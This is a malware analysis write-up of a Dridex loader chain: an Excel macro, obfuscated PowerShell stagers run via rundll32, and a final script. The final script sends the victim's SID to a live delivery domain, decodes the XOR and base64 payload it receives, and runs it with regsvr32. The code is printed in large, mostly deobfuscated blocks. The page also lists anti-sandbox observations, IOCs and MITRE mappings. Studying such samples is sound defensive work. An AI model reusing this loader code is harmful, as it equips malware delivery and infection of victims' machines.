## Quick analysis on Powershell Dridex Loader
## Table of Contents
* [Malware analysis](#Malware-analysis)
* [Cyber kill chain](#Cyber-kill-chain)
* [Indicators Of Compromise (IOC)](#IOC)
* [References MITRE ATT&CK Matrix](#Ref-MITRE-ATTACK)
* [Links](#Links)
  + [Original Tweet](#tweet)
  + [Link Anyrun](#Links-Anyrun)

<h2>Malware analysis <a name="Malware-analysis"></a></h2>
<h6>The initial vector an maldoc which use a macro. This the automatic execution of the print of the informations (printed_Layout) for executing the first stager. This parse the content of the cells in keeping the last characters of each cell parsed. Once this done, this executes by a common shell call.</h6>

```vb
Private Sub View_Click()
    Debug.Print "print"
End Sub

Private Sub printed_Layout()
    toprint
End Sub

Function id(m As Variant)
    id = Right(m, 1) 
End Function

Function toprint()
    On Error Resume Next
    v = Range("i93:i424").Value
    h = Range("m102:m458").Value
    For Each e In v
        s = s & id(e)
    Next
    For Each e In h
        d = d & id(e)
    Next
    MsgBox prompt:=" ", Title:=CreateObject("WScript.Shell").Exec(s & Cells(109, 3) & d).StdOut.ReadAll(0): Application.Wait DateAdd("s", 5, Now): ActiveWorkbook.Close False
End Function
```

<h6>The second stager executed begins by creating an alias for the call of the new object and execute command. On a second time, this uses the deflatestream method for decompress the data in memory (final layer).</h6>

```csharp
rundll32 -s shell32.dll , ,ShellExec_RunDLL "pOwErSHElL" "&('nal') ('obj') ('New-Object') -F;
&('nal') ('exec') ('iex') -F;

&('exec')( .('obj') ('Io.sTREaMreader')(( &('obj') ('iO.compressiOn.DEfLATeSTREAm')([syStEm.io.memOrystreAM] [coNvert]::FRomBAse64strINg('JVZZz6s4Ev0ro9ZIt1uZETuEh3lgC1tYQ9 [...] 2lIX3242zS96+//g8='),[sYstEm.io.cOmpREssiON.coMprESsionmode]::decOmprESs )) ,[TexT.ENcoDIng]::utf8) ).ReAdtoenD( );
```

<h6>We can see that the decompressed data, content only a ZIP cut with a common obfuscation technique for the PowerShell script (same thing for the final script).</h6>

```csharp
${B}=("{70}{11}{34}{21}{1} [...] {68}{62}{41}"-f 'WYR0igCXgy6FKMNv+l7Yan4xdg691T2moiGlxLy','/ufu/NJNKwzJVvlsxY0v0aV9PD7er8U+Op9d20DcMyXno/Hr2hZW7O1KaiNqdqU1V','IwMja9kKGPiRs4Nt/raybU','zMbi2tEm5XeXg0QZRt14Sb9EXh6osuvZTRgMPGoRrh6jFiUrpDWzzmZZxIjg/xX+CqhCnTCYbDtT2cQ3Anlruybv' [...] ,'H4sIAAAAAAAEAHVW/XPaSBL9V7Qqn0cKRjE49rlMU','GUtEFG1Rxj','5sPl','YdFa+B2GvkJAmfMEuwxzibp')

```
<h6>The last line executed by the second stager executes the decompression and execution of the data content on the ZIP file.</h6>

```csharp
.('exec') (.('obj') ('IO.streamReader')(.('obj') ('IO.Compression.GZipStream')((.('obj') ('IO.MemoryStream') -A @(,[Convert]::FromBase64String($b))),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()"
```

<h6>The first block of the final script declare a function for parse the return value and the objects used for getting the GUID of the victim.</h6>

```csharp
function X1($input)
{
  $($input.("substring").Invoke(1) -replace('-','')) -replace('1','-');
  return ${_}
};

${QE}=(&("get-process") -Id ${pId})."mainwindowhandle";
${XX}=&("new-object") [Runtime.InteropServices.HandleRef](1,${QE});
${T}=&("new-object") [Runtime.InteropServices.HandleRef](2,0);
```

<h6>The following block, load a window for getting the GUID in requesting the windows identity way.</h6>

```csharp
(( [TyPE]("reflection.assembly")."VAlUe"::("LoadWithPartialName").Invoke(("WindowsBase"))).("GetType").Invoke(("ms.win32.unsafenativemethods")))::("SetWindowPos").Invoke(${xX},${t},0,0,100,100,64.5*256);
$GUID = X1 (([TyPe]("system.security.principal.windowsidentity")."VAlue"::("GetCurrent").Invoke())."USER"."VALUE");
```
<h6>The next part of the code add the GUID to the URL of the delivery domain, create a web client for download the bytes form the reply of the domain and join it on a string. At the same time,this creates a filename on the one random file selected on modify the last four letters on this.</h6>

```csharp
${url}="https://rumetonare.com/?"+$GUID; 
$c2 =New-object "Net.Webclient";
$data=(([Char[]]($c2.DownloadData($url)) -Join'' );
$pathenv=${ENV:temp};
$filename=(${d}=.("gci") $pathenv|.("get-random"))."nAME" -replace ".{4}$"; #get random name from a random file on temp folder 
$path=$pathenv+'\'+$filename+'.';
```

<h6>Once this did, this cut the first character and put on the variable which is used for check if the decoding operation has been successful and as value for decode the data (cf next block). After this, this removes the first character from the string. This declares a new alias for the execution of the charge, the encoding for later and a function for converts the data on base 64. This pushes the data on the new variable with a split (The data don't content an "!" character, this only for making harder the detection).</h6>

```csharp
$m=$data.substring(0,1);
$valcheck=[int]$m*100; #500
$d1 =$data.remove(0,1)
$d2=$d1 -split'!';
&("sal") ("las") ("regsvr32");
$encode = [Type]("text.encoding")."vALue"::"uTf8"

function Decode_Base64($database64)
{
  $str =  [Convert]::FromBase64String($database64);
  return $str
}
```
<h6>The final block of code uses an for each for parse all bytes (if splitted) or with the last sentence, we haven't a splitted byte (only a string), by this way all the data are on the first element of this (0 is first element.), this loop is so useless and is only one executed. On the same way, the value for the decoding the data have only one character and placed on the first element of the array ($tmp), in selecting $tmp[0] is equal to $m. Both operation are for making harder the detection too. After this, this allocate an array for the data, decode the data in base 64 and decode with an XOR by variable $m. This array is after encoded in UTF-8 and again decoded from base 64 for getting in return value an array of bytes which writes on a file with the path preciously defined.</h6>

```csharp
foreach($a in $d2[0])
{

  $tab=@();
  $tmp=$m.ToCharArray()
  $a=Decode_Base64 ($a);

  for($i=0;$i -lt $a."coUNT";$i++)
  {
    $tab += [char]( [Byte]$a[$i] -bxor [Byte]$tmp[$i%$tmp."coUNT"] ) # [$i%$tmp."coUNT"] equal 0 -> $tmp[0] ->  $m
  }
};
$inter=$d1."rEpLACE"(($d2[0]+"!"),$encode."GETsTRinG"($tab));
[iO.fiLe]::WriteAllBytes($path,( Decode_Base64 ($inter -replace ".{200}$")));
```

<h6>This verifies if the operation was successful, push some timers, define the argument for the execution and execute it after modify the data preciously wrote on the disk.</h6>

```csharp
if((.("gci") $path)."Length" -lt $valcheck){exit};
&("sleep") 12;
&("las") -s $path;
&("sleep") 12;
[Type]("iO.fiLe")."VAlUE"::("WriteAllLines").Invoke($path, [tYpe]("regeX")::("replace").Invoke($GUID,'\d',''))
```

<h3>Important notes :</h3>
<h6>Between the fuzzing of the domains with random GUID generated and from the sandbox attempts, some interesting things can be observed:
<ul>
<li>When ofters that a GUID is pushing as arguments on the domain, this doesn't reply in sending data. (use Regex for verifying the data).</li>
<li>If the GUID have already used, don't reply too. (Anti-sandbox and Anti-analysis)</li>
<li>The domain can give wrong data, with some GUID, the data throws an error on the decoding process, by this way on the checking process, this removes the data decoded and throws a second exception due to the file don't exist (The attacker probably follows security searchers, see the sandbox links and compare the submissions date to the logs for banning the GUID ?).</li>
<li>If valid for each GUID, give a custom encoding data and key</li>
</ul>
Here, with two different GUID :
<br/><br/>
51 90 50 86 67 89 110 74 121 102 <br/><br/>
56 98 71 53 74 97 88 108 53 100
</h6>

<h2> Cyber kill chain <a name="Cyber-kill-chain"></a></h2>
<h6>This process graph represent the cyber kill chain used by the attacker.</h6>
<center>
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Additional%20Analysis/Dridex/2020-05-01/Pictures/Killchain.png">
</center>
<h2> Indicators Of Compromise (IOC) <a name="IOC"></a></h2>
<h6> The IOC can be exported in <a href="https://github.com/StrangerealIntel/CyberThreatIntel/blob/master/Additional%20Analysis/Dridex/2020-05-01/IOC-Dridex_2020_05_01.json">JSON</a> and <a href="https://github.com/StrangerealIntel/CyberThreatIntel/blob/master/Additional%20Analysis/Dridex/2020-05-01/IOC-Dridex_2020_05_01.csv">CSV</a></h6>

<h2> References MITRE ATT&CK Matrix <a name="Ref-MITRE-ATTACK"></a></h2>

|Enterprise tactics|Technics used|Ref URL|
| :---------------: |:-------------| :------------- |
|Execution|Rundll32|https://attack.mitre.org/techniques/T1085|
|Defense Evasion|Rundll32|https://attack.mitre.org/techniques/T1085|
|Discovery|Query Registry<br>System Information Discovery|https://attack.mitre.org/techniques/T1012<br>https://attack.mitre.org/techniques/T1082|

<h6> This can be exported as JSON format <a href="https://github.com/StrangerealIntel/CyberThreatIntel/blob/master/Additional%20Analysis/Dridex/2020-05-01/Mitre-Dridex_2020_05_01.json">Export in JSON</a></h6>

<h2>Links <a name="Links"></a></h2>
<h6> Original tweet: </h6><a name="tweet"></a>

* [https://twitter.com/JAMESWT_MHT/status/1255558542884569091](https://twitter.com/JAMESWT_MHT/status/1255558542884569091) 

<h6> Links Anyrun: <a name="Links-Anyrun"></a></h6>

* [9400537845275.xls](https://app.any.run/tasks/02f6a2d5-ca9c-4081-a955-45f0658a61ca)
* [bgrrcojo.dll](https://app.any.run/tasks/8e1155e0-23d2-41dc-a199-581775445c56)
